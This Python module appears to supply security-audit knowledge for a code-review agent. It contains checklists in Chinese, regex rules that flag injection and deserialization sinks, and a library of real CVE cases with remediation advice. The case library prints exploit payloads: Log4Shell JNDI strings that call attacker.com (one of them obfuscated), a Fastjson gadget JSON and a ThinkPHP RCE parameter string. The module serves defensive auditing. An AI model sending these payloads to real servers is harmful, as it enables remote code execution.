# -*- coding: utf-8 -*-
"""安全领域知识 —— 整合自 gbt-codeagent/docs/security。

包含：通用安全审计语义提示、安全领域检查清单、
真实漏洞案例库、快速检索规则等。

数据来源：
- gbt-codeagent/docs/security/universal.md
- gbt-codeagent/docs/security/domains/*.md
- gbt-codeagent/docs/security/quick-grep-rules.md
- gbt-codeagent/docs/security/real_world_vulns.md
"""

from typing import Any, Dict, List


# ═══════════════════════════════════════════════════════════════
# 第一部分：通用安全审计语义提示
# ═══════════════════════════════════════════════════════════════

UNIVERSAL_SECURITY_HINTS = """
## 通用安全审计语义提示（适用于所有语言）

### D2: 认证 (通用)
- 密码重置令牌是否足够随机、有过期、单次使用、绑定用户？
- 多因素认证是否可被跳过（直接调用验证后接口）？
- 登录是否有暴力破解防护（速率限制/账户锁定）？

### D3: 授权 (通用)
- **IDOR**: 所有 findById(id) 是否同时校验 userId？对比 CRUD 各操作的权限一致性。
- **垂直越权**: 管理员功能是否仅靠前端隐藏？是否有服务端角色校验？
- **组织隔离**: 多租户场景下，API 是否校验资源的租户归属？

### D7: 加密 (通用)
- 弱算法: MD5/SHA1/DES/RC4/ECB 是否用于安全场景？
- 硬编码密钥/IV 是否存在于源码或配置文件中？

### D8: 信息泄露 (通用)
- 异常响应是否包含堆栈、SQL 语句、内部路径？
- 日志是否记录 password/token/secret/信用卡号？
- .env / .git / swagger-ui / debug 端点是否对外暴露？

### D9: 业务逻辑 (通用)
- 金额/数量/折扣是否由客户端传入且服务端未重新计算？
- 并发请求是否可导致余额/库存多次扣减（竞态条件）？
- 多步流程是否可跳过中间步骤？
- 速率限制: 验证码/短信/邮件发送是否有频率控制？
- IDOR/水平越权: 按 ID 查询资源后是否校验归属当前用户？
- 权限注解完整性: 同一资源的 CRUD 操作权限检查是否一致？
- Mass Assignment: 请求体是否直接绑定含敏感字段的实体？
- 数据导出/批量操作: 导出范围是否受限于当前用户/租户？
"""


# ═══════════════════════════════════════════════════════════════
# 第二部分：安全领域检查清单
# ═══════════════════════════════════════════════════════════════

SECURITY_DOMAINS: Dict[str, Dict[str, Any]] = {
    "authentication_authorization": {
        "title": "认证与授权",
        "checks": [
            "认证流程是否可绕过（密码重置、多因素跳过、会话固定）",
            "权限检查是否覆盖所有敏感操作（CRUD 一致性）",
            "IDOR: 按 ID 查询是否校验归属",
            "垂直越权: 管理员功能是否有服务端校验",
            "多租户场景下资源租户归属校验",
            "Session 管理是否安全（固定、超时、并发）",
            "密码策略是否安全（长度、复杂度、历史）",
        ],
    },
    "input_validation": {
        "title": "输入验证",
        "checks": [
            "所有用户输入是否经过验证和清理",
            "边界检查是否完整（长度、范围、格式）",
            "数据类型验证是否充分",
            "白名单验证优先于黑名单",
            "文件上传类型验证是否充分",
            "URL/路径验证是否充分",
        ],
    },
    "cryptography": {
        "title": "加密安全",
        "checks": [
            "是否使用弱加密算法（MD5/SHA1/DES/RC4/ECB）",
            "密钥是否硬编码在源码或配置中",
            "随机数生成是否使用安全随机源",
            "SSL/TLS 配置是否安全",
            "密钥管理是否安全（轮换、存储、传输）",
        ],
    },
    "business_logic": {
        "title": "业务逻辑",
        "checks": [
            "金额/数量/折扣是否由服务端计算",
            "并发操作是否有竞态条件防护",
            "多步流程是否可跳过中间步骤",
            "状态转换是否有状态机验证",
            "幂等性: 重复请求是否安全",
            "速率限制: 敏感操作是否有频率控制",
        ],
    },
    "file_operations": {
        "title": "文件操作",
        "checks": [
            "文件路径是否验证（路径遍历防护）",
            "文件上传类型是否充分验证",
            "上传文件是否存储在 Web 根目录外",
            "文件名是否安全处理（特殊字符、编码）",
            "大文件上传是否有大小限制",
        ],
    },
    "api_security": {
        "title": "API 安全",
        "checks": [
            "API 是否有认证和授权检查",
            "速率限制是否配置",
            "输入验证是否充分",
            "错误响应是否泄露敏感信息",
            "CORS 配置是否限制可信源",
            "GraphQL: 查询深度和复杂度限制",
        ],
    },
    "dependencies": {
        "title": "依赖安全",
        "checks": [
            "是否使用已知有漏洞的组件（Log4j、Fastjson、Shiro 等）",
            "依赖版本是否锁定",
            "是否定期审计依赖安全性",
            "供应链攻击防护措施",
        ],
    },
    "information_disclosure": {
        "title": "信息泄露",
        "checks": [
            "错误响应是否包含堆栈/SQL/内部路径",
            "日志是否记录敏感数据",
            "调试端点是否对外暴露",
            "源码/配置文件是否可访问",
            "HTTP 安全头是否配置",
        ],
    },
    "session_management": {
        "title": "会话管理",
        "checks": [
            "登录后是否创建新 Session ID",
            "Session 超时是否合理",
            "Cookie 是否设置 Secure/HttpOnly/SameSite",
            "并发登录控制",
            "登出是否销毁服务端 Session",
        ],
    },
    "race_conditions": {
        "title": "竞态条件",
        "checks": [
            "余额/库存操作是否有原子性保证",
            "检查-然后-操作模式是否安全",
            "共享资源是否有同步保护",
            "乐观锁/悲观锁是否正确使用",
        ],
    },
    "oauth_oidc_saml": {
        "title": "OAuth/OIDC/SAML",
        "checks": [
            "OAuth redirect_uri 是否严格白名单校验",
            "state 参数是否使用且验证（防 CSRF）",
            "Authorization Code 是否仅使用一次",
            "SAML 断言签名是否验证",
            "Token 存储是否安全（非 localStorage/URL）",
            "PKCE 是否用于公共客户端",
        ],
    },
    "graphql": {
        "title": "GraphQL 安全",
        "checks": [
            "查询深度限制是否配置",
            "查询复杂度限制是否配置",
            "Introspection 是否在生产环境禁用",
            "字段级权限控制是否到位",
            "批量查询攻击防护",
        ],
    },
    "message_queue_async": {
        "title": "消息队列与异步",
        "checks": [
            "消息队列是否有认证",
            "消息内容是否加密（敏感数据）",
            "消费者是否有幂等性保证",
            "消息积压是否有监控和告警",
            "死信队列是否正确处理",
        ],
    },
    "logging_security": {
        "title": "日志安全",
        "checks": [
            "日志是否记录敏感数据（密码、Token、PII）",
            "日志注入防护（CRLF、格式字符串）",
            "日志是否防篡改",
            "访问日志是否记录足够信息用于审计",
        ],
    },
    "serverless": {
        "title": "Serverless 安全",
        "checks": [
            "函数权限是否遵循最小权限原则",
            "环境变量是否包含敏感信息",
            "冷启动是否泄露信息",
            "事件注入防护",
        ],
    },
    "memory_native": {
        "title": "内存与原生代码",
        "checks": [
            "缓冲区溢出检查（strcpy/sprintf/gets）",
            "整数溢出检查",
            "Use-After-Free / Double-Free",
            "格式字符串漏洞",
            "堆溢出和栈溢出",
        ],
    },
    "http_smuggling": {
        "title": "HTTP 走私",
        "checks": [
            "前后端对 Content-Length/Transfer-Encoding 解析是否一致",
            "是否使用不可信的请求头做路由决策",
            "反向代理是否正确处理分块传输",
        ],
    },
    "cache_host_header": {
        "title": "缓存与 Host 头",
        "checks": [
            "Host 头是否验证或规范化",
            "缓存键是否包含 Host 头",
            "Web 缓存投毒防护",
            "缓存欺骗防护",
        ],
    },
    "cross_service_trust": {
        "title": "跨服务信任",
        "checks": [
            "服务间调用是否有认证",
            "内部 API 是否可从外部访问",
            "服务间通信是否加密",
            "信任边界是否明确",
        ],
    },
    "scheduled_tasks": {
        "title": "定时任务",
        "checks": [
            "定时任务是否有认证保护",
            "任务参数是否可被外部注入",
            "任务重叠执行是否有防护",
            "任务失败是否有告警",
        ],
    },
    "infra_supply_chain": {
        "title": "基础设施与供应链",
        "checks": [
            "CI/CD 管道是否有权限控制",
            "构建产物是否有完整性校验",
            "容器镜像是否使用可信基础镜像",
            "Secret 是否通过安全方式注入（非环境变量明文）",
        ],
    },
    "mobile_security": {
        "title": "移动安全",
        "checks": [
            "API 密钥是否硬编码在客户端",
            "证书固定是否实现",
            "本地存储是否加密",
            "调试标志是否在生产构建中移除",
        ],
    },
    "frontend_frameworks": {
        "title": "前端框架安全",
        "checks": [
            "DOM XSS 防护（v-html/dangerouslySetInnerHTML）",
            "模板注入防护",
            "第三方脚本是否有 SRI 校验",
            "postMessage 是否验证 origin",
        ],
    },
    "llm_security": {
        "title": "LLM 安全",
        "checks": [
            "Prompt 注入防护",
            "LLM 输出是否在执行前验证",
            "敏感数据是否可被 LLM 泄露",
            "Agent 权限是否限制",
        ],
    },
}


# ═══════════════════════════════════════════════════════════════
# 第三部分：快速检索规则
# ═══════════════════════════════════════════════════════════════

QUICK_GREP_RULES: Dict[str, List[Dict[str, str]]] = {
    "sql_injection": [
        {"pattern": r"(?i)(select|update|delete|insert).*(\+|format\(|f\"|%s|\$\{)", "description": "通用 SQL 拼接模式"},
        {"pattern": r"createStatement\(|prepare\(.*\+", "description": "Java SQL 拼接"},
        {"pattern": r"executeQuery\(|executeUpdate\(|createStatement\(", "description": "Java JDBC 危险方法"},
        {"pattern": r"@Query\(.*\$\{.*\}", "description": "MyBatis ${} 不安全拼接"},
        {"pattern": r"sequelize\.query\(|knex\.raw\(|\$queryRawUnsafe", "description": "Node.js SQL 注入"},
        {"pattern": r"cursor\.execute\(f\"|cursor\.execute\(.*%", "description": "Python SQL 拼接"},
        {"pattern": r"mysqli_query\(|pdo->query\(", "description": "PHP SQL 查询"},
        {"pattern": r"FromSqlRaw\(|ExecuteSqlRaw\(", "description": ".NET SQL 注入"},
    ],
    "command_injection": [
        {"pattern": r"(?i)exec\(|system\(|popen\(|ProcessBuilder\(|Runtime\.getRuntime\(\)\.exec", "description": "通用命令执行"},
        {"pattern": r"child_process\.(exec|execSync|spawn|spawnSync)", "description": "Node.js 子进程"},
        {"pattern": r"subprocess\.(run|Popen|call).*shell\s*=\s*True", "description": "Python shell=True"},
        {"pattern": r"shell_exec\(|passthru\(|proc_open\(", "description": "PHP 命令执行"},
        {"pattern": r"ProcessStartInfo|Process\.Start\(", "description": ".NET 进程启动"},
    ],
    "deserialization": [
        {"pattern": r"ObjectInputStream|readObject\(", "description": "Java 反序列化"},
        {"pattern": r"BinaryFormatter|LosFormatter|NetDataContractSerializer", "description": ".NET 反序列化"},
        {"pattern": r"pickle\.loads|yaml\.load\(|marshal\.loads", "description": "Python 反序列化"},
        {"pattern": r"unserialize\(", "description": "PHP 反序列化"},
        {"pattern": r"JSON\.parse\(.*__proto__", "description": "原型链污染"},
    ],
    "xxe": [
        {"pattern": r"DocumentBuilderFactory|SAXParserFactory|XMLInputFactory", "description": "Java XML 解析器"},
        {"pattern": r"setFeature\(.*disallow-doctype-decl", "description": "XXE 安全特性（反向检测）"},
        {"pattern": r"resolveEntity\(|XmlResolver|DtdProcessing", "description": "XML 实体解析"},
    ],
    "ssrf": [
        {"pattern": r"new URL\(|URI\.create\(|HttpClient|RestTemplate|WebClient", "description": "Java HTTP 客户端"},
        {"pattern": r"requests\.(get|post)|httpx\.|urllib\.request", "description": "Python HTTP 请求"},
        {"pattern": r"axios\.|fetch\(|got\(", "description": "Node.js HTTP 请求"},
        {"pattern": r"curl_exec\(|file_get_contents\(.*http", "description": "PHP HTTP 请求"},
    ],
    "auth_bypass": [
        {"pattern": r"@PermitAll|AllowAnonymous|skipAuth|bypassAuth", "description": "认证跳过注解"},
        {"pattern": r"isAdmin", "description": "脆弱的管理员判断"},
    ],
    "file_operations": [
        {"pattern": r"multipart|IFormFile|multer|move_uploaded_file", "description": "文件上传处理"},
        {"pattern": r"\.\./|\.\.\\\\|path\.join|Path\.Combine|normalize\(", "description": "路径拼接/遍历"},
    ],
    "business_logic": [
        {"pattern": r"price|amount|total|balance.*=.*request\.", "description": "客户端控制金额"},
        {"pattern": r"status\s*=\s*request\.", "description": "客户端控制状态"},
    ],
}


# ═══════════════════════════════════════════════════════════════
# 第四部分：真实漏洞案例库
# ═══════════════════════════════════════════════════════════════

REAL_WORLD_VULNS: List[Dict[str, Any]] = [
    {
        "id": "log4shell",
        "cve": "CVE-2021-44228",
        "name": "Log4Shell",
        "type": "RCE (JNDI 注入)",
        "severity": "CRITICAL",
        "cvss": 10.0,
        "affected": "Log4j 2.0 - 2.14.1",
        "fixed": "2.17.0+",
        "description": "Log4j 2.x Message Lookup Substitution 功能解析 ${} 表达式，攻击者通过注入 ${jndi:ldap://attacker.com/a} 触发远程类加载",
        "payloads": [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:rmi://attacker.com/a}",
            "${${lower:j}ndi:${lower:l}dap://attacker.com/a}",
        ],
        "detection": ["grep -rn 'log4j-core' pom.xml", "检查版本 < 2.17.0"],
        "remediation": "升级到 Log4j 2.17.1+，或设置 -Dlog4j2.formatMsgNoLookups=true",
    },
    {
        "id": "spring4shell",
        "cve": "CVE-2022-22965",
        "name": "Spring4Shell",
        "type": "RCE (ClassLoader 操控)",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "affected": "Spring Framework 5.3.0-5.3.17, 5.2.0-5.2.19 + JDK 9+ + WAR 部署",
        "fixed": "5.3.18+",
        "description": "Spring MVC 参数绑定机制可通过 class.module.classLoader 属性链访问 Tomcat AccessLogValve，写入 WebShell",
        "payloads": [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=...",
        ],
        "detection": ["grep -rn 'spring-webmvc|spring-beans' pom.xml", "检测 WAR 部署"],
        "remediation": "升级 Spring Framework 到 5.3.18+，禁止 class 属性绑定",
    },
    {
        "id": "fastjson_rce",
        "cve": "CVE-2017-18349 等",
        "name": "Fastjson RCE",
        "type": "RCE (反序列化)",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "affected": "Fastjson < 1.2.83",
        "fixed": "1.2.83+ 或 Fastjson2",
        "description": "Fastjson @type 功能允许反序列化任意类，通过 JdbcRowSetImpl/TemplatesImpl 等 Gadget 实现 RCE",
        "payloads": [
            '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}',
        ],
        "detection": ["grep -rn 'fastjson' pom.xml", "版本 < 1.2.83 有风险"],
        "remediation": "升级到 Fastjson 1.2.83+ 或迁移到 Fastjson2，禁用 AutoType",
    },
    {
        "id": "thinkphp_rce",
        "cve": "CVE-2018-20062",
        "name": "ThinkPHP RCE",
        "type": "RCE (方法覆盖)",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "affected": "ThinkPHP 5.0.0-5.0.23",
        "fixed": "5.0.24+",
        "description": "_method 参数可覆盖请求方法，配合变量覆盖导致 RCE",
        "payloads": [
            "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id",
        ],
        "detection": ["grep -rn 'THINK_VERSION|thinkphp' --include='*.php'"],
        "remediation": "升级 ThinkPHP 到安全版本",
    },
    {
        "id": "event_stream_supply_chain",
        "cve": "N/A",
        "name": "event-stream 供应链攻击",
        "type": "供应链攻击 (Malicious Package)",
        "severity": "HIGH",
        "cvss": 8.0,
        "affected": "event-stream@3.3.6",
        "fixed": "锁定版本到 3.3.4",
        "description": "攻击者获取 event-stream 维护权后添加恶意依赖 flatmap-stream，窃取 Bitcoin 钱包私钥",
        "payloads": [],
        "detection": ["npm audit", "grep 'flatmap-stream' package-lock.json"],
        "remediation": "锁定依赖版本，定期 npm audit，使用 lockfile-lint",
    },
]


# ═══════════════════════════════════════════════════════════════
# 第五部分：查询工具函数
# ═══════════════════════════════════════════════════════════════

def get_domain_checks(domain_id: str) -> List[str]:
    """获取安全领域的检查清单。"""
    domain = SECURITY_DOMAINS.get(domain_id, {})
    return domain.get("checks", [])


def get_grep_rules(vuln_type: str) -> List[Dict[str, str]]:
    """获取漏洞类型的快速检索规则。"""
    return QUICK_GREP_RULES.get(vuln_type, [])


def get_real_world_vuln(vuln_id: str) -> Dict[str, Any]:
    """获取真实漏洞案例。"""
    for v in REAL_WORLD_VULNS:
        if v["id"] == vuln_id:
            return v
    return {}


def search_vulns_by_component(component_name: str) -> List[Dict[str, Any]]:
    """根据组件名搜索相关真实漏洞案例。"""
    results = []
    component_lower = component_name.lower()
    for v in REAL_WORLD_VULNS:
        if component_lower in v.get("affected", "").lower() or component_lower in v.get("name", "").lower():
            results.append(v)
    return results


# 用于 RAG 检索的文档列表
SECURITY_DOMAIN_DOCS = []

for _did, _ddata in SECURITY_DOMAINS.items():
    SECURITY_DOMAIN_DOCS.append({
        "id": f"domain_{_did}",
        "title": _ddata["title"],
        "content": f"{_ddata['title']}: " + "; ".join(_ddata["checks"]),
        "tags": [_did, "security_domain"],
        "category": "security_domain",
    })

for _vuln in REAL_WORLD_VULNS:
    SECURITY_DOMAIN_DOCS.append({
        "id": f"realworld_{_vuln['id']}",
        "title": _vuln["name"],
        "content": f"CVE: {_vuln.get('cve', 'N/A')}, 类型: {_vuln['type']}, 影响: {_vuln['affected']}, 修复: {_vuln['fixed']}",
        "tags": [_vuln["id"], "real_world_vuln", _vuln.get("cve", "")],
        "category": "real_world_vuln",
    })

SECURITY_DOMAIN_DOCS.append({
    "id": "universal_security_hints",
    "title": "通用安全审计语义提示",
    "content": UNIVERSAL_SECURITY_HINTS.strip(),
    "tags": ["universal", "security_hints"],
    "category": "universal_hints",
})
